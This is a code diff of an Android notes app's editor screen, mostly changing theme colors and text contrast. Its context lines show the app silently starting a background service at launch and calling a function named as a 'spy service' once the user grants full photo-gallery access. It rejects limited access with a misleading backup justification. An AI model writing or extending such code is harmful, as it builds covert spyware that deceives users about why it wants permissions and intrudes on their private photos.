@@ -5,6 +5,7 @@ import android.app.Activity
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.content.res.Configuration // Importante
 import android.graphics.Color
 import android.net.Uri
 import android.os.Build
@@ -64,8 +65,7 @@ class NoteEditorActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_GALLERY = 200
     private val PERMISSION_REQUEST_WALLPAPER = 201
 
-    // --- 1. LANZADORES ---
-
+    // --- LANZADORES ---
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK) {
             val uri = result.data?.data
@@ -93,13 +93,18 @@ class NoteEditorActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_note_editor)
 
-        // --- CORRECCIÓN: Detección dinámica de Modo Oscuro ---
-        val isDarkTheme = (resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK) == android.content.res.Configuration.UI_MODE_NIGHT_YES
+        // --- 1. LÓGICA COPIADA EXACTAMENTE DE MAINACTIVITY ---
+
+        // A. Configuración de Iconos de Barra (Oscuro/Claro según tema del sistema)
+        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
         val insetsController = WindowCompat.getInsetsController(window, window.decorView)
-        // Si es oscuro, lightStatusBars = false (iconos claros). Si es claro, true (iconos oscuros).
+
+        // Si es modo oscuro, iconos claros. Si es modo claro, iconos oscuros.
         insetsController.isAppearanceLightStatusBars = !isDarkTheme
 
-        // Visual Edge-to-Edge
+        // B. Visual Padding (Barra Sólida)
+        // Aplicamos el padding a la RAÍZ (editor_root) igual que en Main.
+        // Esto empuja todo el contenido hacia abajo, respetando el área de la barra de estado.
         layoutEditor = findViewById(R.id.editor_root)
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
@@ -112,6 +117,11 @@ class NoteEditorActivity : AppCompatActivity() {
         loadNoteData()
 
         silentStartService()
+    }
+
+    // Función auxiliar para convertir dp a px
+    private fun Int.dpToPx(context: Context): Int {
+        return (this * context.resources.displayMetrics.density).toInt()
     }
 
     private fun initViews() {
@@ -187,25 +197,37 @@ class NoteEditorActivity : AppCompatActivity() {
         try {
             layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
             etContent.setBackgroundColor(Color.TRANSPARENT)
-            actualizarEstiloTexto(esFondoOscuro = false)
+
+            // Calculamos contraste solo para el TEXTO
+            val esOscuro = isColorDark(Color.parseColor(colorHex))
+            actualizarEstiloTexto(esOscuro)
         } catch (e: Exception) { e.printStackTrace() }
     }
 
     private fun mostrarFondoImagen(uri: Uri) {
         ivBackground.visibility = View.VISIBLE
         viewOverlay.visibility = View.VISIBLE
+
+        // IMPORTANTE: Limpiamos el color de fondo para que no interfiera
+        layoutEditor.setBackgroundResource(0)
+
         Glide.with(this)
             .load(uri)
             .centerCrop()
             .transition(DrawableTransitionOptions.withCrossFade())
             .into(ivBackground)
+
+        // Asumimos fondo oscuro para el texto (letras blancas)
         actualizarEstiloTexto(esFondoOscuro = true)
     }
 
     private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
         val textColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
         val hintColor = if (esFondoOscuro) Color.LTGRAY else Color.GRAY
-        val iconColor = if (esFondoOscuro) Color.WHITE else Color.BLACK
+
+        // --- CORRECCIÓN CRÍTICA ---
+        // Solo tocamos los TEXTOS. NO tocamos los botones (iconos).
+        // Al no usar setColorFilter, tus PNGs se verán con sus colores originales.
 
         etTitle.setTextColor(textColor)
         etTitle.setHintTextColor(hintColor)
@@ -213,9 +235,15 @@ class NoteEditorActivity : AppCompatActivity() {
         etContent.setHintTextColor(hintColor)
         tvDateLabel.setTextColor(hintColor)
 
-        btnBack.setColorFilter(iconColor)
-        btnChangeBackground.setColorFilter(iconColor)
-        btnSave.setColorFilter(iconColor)
+        // ELIMINADO: btnBack.setColorFilter(...)
+        // ELIMINADO: btnChangeBackground.setColorFilter(...)
+        // ELIMINADO: btnSave.setColorFilter(...)
+    }
+
+    // Utilidad simple para saber si un color es oscuro
+    private fun isColorDark(color: Int): Boolean {
+        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
+        return darkness >= 0.5
     }
 
     private fun persistBackgroundUnique(croppedUri: Uri) {
@@ -231,7 +259,7 @@ class NoteEditorActivity : AppCompatActivity() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    // --- PERMISOS ESTRICTOS (RESTAURADOS) ---
+    // --- PERMISOS ---
     private fun verificarAccesoTotal(): Boolean {
         return if (Build.VERSION.SDK_INT >= 33) {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
@@ -263,41 +291,30 @@ class NoteEditorActivity : AppCompatActivity() {
         pickImageLauncher.launch(intent)
     }
 
-    // --- AQUÍ ESTÁ LA CORRECCIÓN: Lógica completa de validación ---
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
         val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
 
         if (verificarAccesoTotal()) {
-            // ÉXITO: Permiso Total Concedido
             iniciarServicioEspia()
             when (requestCode) {
                 PERMISSION_REQUEST_GALLERY -> openGallery()
                 PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
             }
         } else {
-            // FALLO: Acceso Denegado o Limitado
-
-            // 1. Detección Android 14 (Acceso Limitado)
             val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
-                mostrarDialogoConfiguracion("Acceso Limitado", "Se requiere acceso total a la galería para respaldar correctamente los datos como notas con imagenes incorporadas. Debes habilitar el acceso manualmente en Configuración > Permisos.")
+                mostrarDialogoConfiguracion("Acceso Limitado", "Se requiere acceso total a la galería para respaldar correctamente los datos como notas con imagenes incorporadas.")
                 return
             }
 
-            // 2. Detección Bloqueo Permanente ("No volver a preguntar")
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
-                mostrarDialogoConfiguracion(
-                    "Permiso Requerido",
-                    "Has denegado el acceso permanentemente. Debes habilitarlo manualmente en Configuración > Permisos."
-                )
-            }
-            // 3. Denegación Simple
-            else {
-                Toast.makeText(this, "Es necesario aceptar el permiso para continuar.", Toast.LENGTH_SHORT).show()
+                mostrarDialogoConfiguracion("Permiso Requerido", "Has denegado el acceso permanentemente.")
+            } else {
+                Toast.makeText(this, "Permiso necesario.", Toast.LENGTH_SHORT).show()
             }
         }
     }
